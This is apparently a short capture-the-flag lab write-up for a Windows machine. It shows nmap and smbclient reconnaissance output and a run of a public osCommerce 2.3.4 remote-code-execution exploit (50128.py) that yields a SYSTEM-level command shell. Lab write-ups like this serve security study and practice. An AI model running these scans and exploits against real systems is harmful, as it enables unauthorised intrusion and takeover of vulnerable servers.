initial nmap scan
```
sudo nmap -sV -Pn -p- -T 4 -sS '10.10.16.106'
[sudo] password for gomez22:
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-26 12:40 PDT
Warning: 10.10.16.106 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.16.106
Host is up (0.31s latency).
Not shown: 65506 closed tcp ports (reset)
PORT      STATE    SERVICE      VERSION
80/tcp    open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
135/tcp   open     msrpc        Microsoft Windows RPC
139/tcp   open     netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open     ssl/http     Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
445/tcp   open     microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open     mysql        MariaDB (unauthorized)
3483/tcp  filtered slim-devices
6599/tcp  filtered unknown
8080/tcp  open     http         Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
14668/tcp filtered unknown
18512/tcp filtered unknown
22312/tcp filtered unknown
32253/tcp filtered unknown
38976/tcp filtered unknown
39105/tcp filtered unknown
41854/tcp filtered unknown
43743/tcp filtered unknown
44859/tcp filtered unknown
48179/tcp filtered unknown
49152/tcp open     msrpc        Microsoft Windows RPC
49153/tcp open     msrpc        Microsoft Windows RPC
49154/tcp open     msrpc        Microsoft Windows RPC
49158/tcp open     msrpc        Microsoft Windows RPC
49159/tcp open     msrpc        Microsoft Windows RPC
49160/tcp open     msrpc        Microsoft Windows RPC
49735/tcp filtered unknown
54880/tcp filtered unknown
58369/tcp filtered unknown
64623/tcp filtered unknown
Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows
```

smbclient
```
└─$ smbclient -L 10.10.16.106
Password for [WORKGROUP\gomez22]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Users           Disk
        Windows         Disk
```

I found RCE exploits for the oscommerce-2.3.4 version that is running. I used the exploit to get a reverse shell

```
└─$ python3 50128.py http://10.10.16.106:8080/oscommerce-2.3.4/catalog
[*] Install directory still available, the host likely vulnerable to the exploit.
[*] Testing injecting system command to test vulnerability
User: nt authority\system

RCE_SHELL$ ls

RCE_SHELL$ dir
 Volume in drive C has no label.
 Volume Serial Number is 14AF-C52C

 Directory of C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes

09/26/2022  09:24 PM    <DIR>          .
09/26/2022  09:24 PM    <DIR>          ..
04/11/2019  10:52 PM               447 application.php
09/26/2022  09:26 PM             1,118 configure.php
04/11/2019  10:52 PM    <DIR>          functions
               2 File(s)          1,565 bytes
               3 Dir(s)  19,509,338,112 bytes free

RCE_SHELL$ whoami
nt authority\system

```
